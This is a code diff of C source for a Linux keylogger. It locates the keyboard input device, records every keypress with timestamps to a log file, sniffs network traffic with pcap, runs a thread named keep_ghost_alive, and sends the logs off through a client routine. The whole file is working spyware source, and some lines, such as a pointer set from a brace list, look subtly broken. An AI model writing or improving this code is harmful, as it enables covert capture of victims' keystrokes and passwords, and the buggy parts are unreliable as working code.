@@ -18,7 +18,7 @@
 
 #include "key_util.h"
 #include "util.h"
-#include "server_client.h"
+#include "client.h"
 #include "config.h"
 
 #include "ip.h"
@@ -43,14 +43,32 @@ void* start_keylogging(void *args);
 void* send_logs();
 struct Config retrive_keyboard_file();
 
+struct keylog_print{
+    struct loginfo *k_loginfo;
+    struct Config  config;
+};
+
 int main(int argc, char **argv)
 {
     pid_t id = -1;
     if (argc >= 2)
         id = atoi(argv[1]);
-
-    Config config = retrive_keyboard_file();
     
+    start_client();
+    /*Retrieve Keyboard file descriptor*/
+    struct Config config = retrive_keyboard_file();
+    /*Open log file*/
+    FILE *keylog_log = fopen("log/keylog.txt", "a");
+    if (keylog_log == NULL)
+    {
+        printf("Error opening keylog log. Exiting...\n");
+        exit(1);
+    }
+    
+    struct loginfo *k_loginfo = { keylog_log, NEVER_WRITTEN, 4 };
+    struct keylog_print keylog_print_1 = { k_loginfo , config };
+    setbuf(keylog_log, NULL);
+    /*Create threads*/
     pthread_attr_t attr;
     pthread_attr_init(&attr);
 
@@ -58,24 +76,23 @@ int main(int argc, char **argv)
     pthread_create(&aliver, &attr, keep_ghost_alive, &id);
     
     pthread_t keylog;
-    pthread_create(&keylog, &attr, start_keylogging, &config);
+    pthread_create(&keylog, &attr, start_keylogging, (void *)&keylog_print_1);
     
     pthread_t sendlogs;
     pthread_create(&sendlogs, &attr, send_logs, NULL);
 
-    FILE *network_log = fopen("/.keylogger/log/network.txt", "a");
+    /***TODO - update paths***/
+    /*Open log folders*/
+    FILE *network_log = fopen("log/network.txt", "a");
     if (network_log == NULL)
     {
         printf("Error opening network log. Exiting...");
         exit(1);
     }
     setbuf(network_log, NULL);
-
     struct loginfo info = { network_log, NEVER_WRITTEN, 4 };
 
-    FILE *keylog_log = fopen("/.keylogger/log/keylog.txt", "a");
-    config.keylog_log = keylog_log;
-    setbuf(keylog_log, NULL);  //Disable buffering to write on every KEY_PRESS
+
     
     /* Variables for pcap sniffing, such as error buffer, device to be read
        and filters, masks, etc. */
@@ -202,7 +219,7 @@ void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_cha
 struct Config retrive_keyboard_file()
 {
     /*retrieve keyboard device file*/
-    Config config;
+    struct Config config;
     static const char *command =
     "grep -E 'Handlers|EV' /proc/bus/input/devices |"
     "grep -B1 120013 |"
@@ -237,14 +254,10 @@ void* start_keylogging(void *args)
     input_event event;
     int shift_pressed=0; //If shift engaged, shift_pressed = 1
 
-    Config *config = args;
-
-    /*Use struct for timestamped_write*/
-    FILE *keylog_filename = config->keylog_log;
-
-   // daemon(1, 0);
+    struct keylog_print keylog_print_1 =  *(struct keylog_print *)args;
+    //struct loginfo *k_info = keylog_print_1.k_loginfo;
     
-    while (read(config->kb_fd, &event, sizeof(input_event)) > 0){
+    while (read(keylog_print_1.config.kb_fd, &event, sizeof(input_event)) > 0){
         if (event.type == EV_KEY) {
             if (event.value == KEY_PRESS) {
                 if (is_shift(event.code)) {
@@ -252,10 +265,8 @@ void* start_keylogging(void *args)
                 }
                 char *name = get_key_text(event.code, shift_pressed);
                 if (strcmp(name, "\0") != 0) {
-                    fprintf(keylog_filename, "%s", name);
-                    /*
-                   timestamped_write(keylog_info, name);
-                   timestamped_write(keylog_info, "\n"); */
+                   timestamped_write(keylog_print_1.k_loginfo, name);
+                   timestamped_write(keylog_print_1.k_loginfo, "\n");
                 }
             } else if (event.value == KEY_RELEASE) {
                 if (is_shift(event.code)) {
@@ -269,8 +280,6 @@ void* start_keylogging(void *args)
 
 void* send_logs()
 {
-    //sleep(300); //sleep for 300sec = 5 min
-    run_client();
-    run_server();
+    start_client();
     return EXIT_SUCCESS;
 }
